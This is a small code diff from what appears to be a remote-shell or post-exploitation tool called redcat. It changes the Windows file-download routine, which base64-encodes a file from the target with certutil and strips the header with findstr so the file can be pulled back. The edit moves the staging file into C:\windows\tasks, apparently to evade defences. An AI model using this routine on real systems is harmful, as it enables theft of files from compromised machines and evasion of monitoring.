@@ -58,7 +58,7 @@ class Windows(redcat.platform.Platform):
                 error = redcat.style.bold("can't download " + redcat.style.red(f"{rfile}") + ": " + data.decode("utf-8"))
             else:
                 tmp_fname = base64.b64encode(os.urandom(16)).decode("utf-8").replace("/", "_").replace("=", "0") + ".tmp"
-                tmp_file = f"\"C:\\windows\\temp\\{tmp_fname}\""
+                tmp_file = f"\"C:\\windows\\tasks\\{tmp_fname}\""
                 res, cmd_success, data = redcat.transaction.Transaction(f"certutil -encode {rfile} {tmp_file}".encode(), self, True).execute()
                 if res and cmd_success:
                     res, cmd_success, data = redcat.transaction.Transaction(f"findstr /v CERTIFICATE {tmp_file}".encode(), self, True).execute()
